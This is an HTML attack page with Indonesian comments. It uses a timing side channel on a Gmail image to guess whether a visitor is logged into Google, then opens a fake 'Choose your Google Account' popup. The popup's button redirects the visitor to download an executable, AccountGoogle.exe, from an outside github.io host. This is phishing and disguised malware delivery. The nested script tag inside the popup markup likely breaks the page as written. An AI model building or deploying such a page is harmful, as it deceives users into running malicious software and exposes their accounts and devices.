<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSLeaks Google Login Detection</title>
</head>
<body>
  <h2>Checking Google login status...</h2>
  <div id="status">Detecting...</div>

  <script>
    function detectGoogleLogin(callback) {
      const img = new Image();
      const start = performance.now();

      // Target resource yang beda perilaku kalo login / nggak login
      img.src = "https://mail.google.com/mail/u/0/images/cleardot.gif";

      img.onload = () => {
        const time = performance.now() - start;
        console.log("Image loaded in:", time);

        // Kalau user login → cleardot.gif cepat ke-load
        if (time < 500) {
          callback(true); // Logged in!
        } else {
          callback(false); // Not logged in
        }
      };

      img.onerror = () => {
        console.log("Error loading image");
        callback(false); // Assume not logged in
      };
    }

    detectGoogleLogin((loggedIn) => {
      const status = document.getElementById('status');
      if (loggedIn) {
        status.textContent = "✅ User is logged into Google!";
        triggerAttack();
      } else {
        status.textContent = "❌ User is NOT logged in to Google!";
      }
    });

    function triggerAttack() {
      alert("Launching attack on logged-in user...");

      // Bisa trigger fake popup login atau drive-by download
      const popup = window.open('', 'GoogleLogin', 'width=500,height=600');

      popup.document.write(`
        <html>
        <head><title>Google Login</title></head>
        <body style="text-align:center;">
          <h2>Choose your Google Account</h2>
          <button onclick="download()">Continue</button>

          <script>
            function download() {
              window.location.href = 'https://lanaya113505.github.io/pizza/AccountGoogle.exe';
            }
          </script>
        </body>
        </html>
      `);
    }
  </script>
</body>
</html>
